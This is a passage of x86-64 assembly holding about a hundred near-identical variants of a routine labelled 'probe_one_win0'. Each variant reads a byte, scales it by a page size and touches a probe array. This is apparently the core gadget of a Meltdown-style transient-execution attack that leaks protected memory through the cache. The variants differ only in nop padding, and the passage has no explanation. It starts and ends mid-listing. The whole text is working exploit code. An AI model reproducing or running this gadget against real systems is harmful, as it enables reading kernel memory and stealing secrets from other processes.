	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 613
.Lprobe_one_win0_var613:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 614
.Lprobe_one_win0_var614:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 615
.Lprobe_one_win0_var615:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 616
.Lprobe_one_win0_var616:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 617
.Lprobe_one_win0_var617:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 618
.Lprobe_one_win0_var618:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 619
.Lprobe_one_win0_var619:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 620
.Lprobe_one_win0_var620:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 621
.Lprobe_one_win0_var621:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 622
.Lprobe_one_win0_var622:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 623
.Lprobe_one_win0_var623:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 624
.Lprobe_one_win0_var624:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 625
.Lprobe_one_win0_var625:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 626
.Lprobe_one_win0_var626:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 627
.Lprobe_one_win0_var627:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 628
.Lprobe_one_win0_var628:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 629
.Lprobe_one_win0_var629:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 630
.Lprobe_one_win0_var630:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 631
.Lprobe_one_win0_var631:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 632
.Lprobe_one_win0_var632:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 633
.Lprobe_one_win0_var633:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 634
.Lprobe_one_win0_var634:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 635
.Lprobe_one_win0_var635:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 636
.Lprobe_one_win0_var636:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 637
.Lprobe_one_win0_var637:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 638
.Lprobe_one_win0_var638:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 639
.Lprobe_one_win0_var639:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 640
.Lprobe_one_win0_var640:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 641
.Lprobe_one_win0_var641:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 642
.Lprobe_one_win0_var642:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 643
.Lprobe_one_win0_var643:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 644
.Lprobe_one_win0_var644:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 645
.Lprobe_one_win0_var645:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 646
.Lprobe_one_win0_var646:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 647
.Lprobe_one_win0_var647:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 648
.Lprobe_one_win0_var648:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 649
.Lprobe_one_win0_var649:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 650
.Lprobe_one_win0_var650:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 651
.Lprobe_one_win0_var651:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 652
.Lprobe_one_win0_var652:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 653
.Lprobe_one_win0_var653:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 654
.Lprobe_one_win0_var654:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 655
.Lprobe_one_win0_var655:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 656
.Lprobe_one_win0_var656:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 657
.Lprobe_one_win0_var657:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 658
.Lprobe_one_win0_var658:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 659
.Lprobe_one_win0_var659:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 660
.Lprobe_one_win0_var660:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 661
.Lprobe_one_win0_var661:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 662
.Lprobe_one_win0_var662:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 663
.Lprobe_one_win0_var663:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 664
.Lprobe_one_win0_var664:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 665
.Lprobe_one_win0_var665:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 666
.Lprobe_one_win0_var666:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 667
.Lprobe_one_win0_var667:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 668
.Lprobe_one_win0_var668:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 669
.Lprobe_one_win0_var669:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 670
.Lprobe_one_win0_var670:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 671
.Lprobe_one_win0_var671:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 672
.Lprobe_one_win0_var672:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 673
.Lprobe_one_win0_var673:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 674
.Lprobe_one_win0_var674:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 675
.Lprobe_one_win0_var675:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 676
.Lprobe_one_win0_var676:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 677
.Lprobe_one_win0_var677:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 678
.Lprobe_one_win0_var678:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 679
.Lprobe_one_win0_var679:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 680
.Lprobe_one_win0_var680:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 681
.Lprobe_one_win0_var681:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 682
.Lprobe_one_win0_var682:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 683
.Lprobe_one_win0_var683:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 684
.Lprobe_one_win0_var684:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 685
.Lprobe_one_win0_var685:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 686
.Lprobe_one_win0_var686:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 687
.Lprobe_one_win0_var687:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 688
.Lprobe_one_win0_var688:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 689
.Lprobe_one_win0_var689:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 690
.Lprobe_one_win0_var690:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 691
.Lprobe_one_win0_var691:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 692
.Lprobe_one_win0_var692:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 693
.Lprobe_one_win0_var693:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 694
.Lprobe_one_win0_var694:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 695
.Lprobe_one_win0_var695:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 696
.Lprobe_one_win0_var696:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 697
.Lprobe_one_win0_var697:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 698
.Lprobe_one_win0_var698:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 699
.Lprobe_one_win0_var699:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 700
.Lprobe_one_win0_var700:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 701
.Lprobe_one_win0_var701:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 702
.Lprobe_one_win0_var702:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 703
.Lprobe_one_win0_var703:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 704
.Lprobe_one_win0_var704:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 705
.Lprobe_one_win0_var705:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 706
.Lprobe_one_win0_var706:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 707
.Lprobe_one_win0_var707:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 708
.Lprobe_one_win0_var708:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 709
.Lprobe_one_win0_var709:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 710
.Lprobe_one_win0_var710:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 711
.Lprobe_one_win0_var711:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 712
.Lprobe_one_win0_var712:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 713
.Lprobe_one_win0_var713:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 714
.Lprobe_one_win0_var714:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 715
.Lprobe_one_win0_var715:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 716
.Lprobe_one_win0_var716:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 717
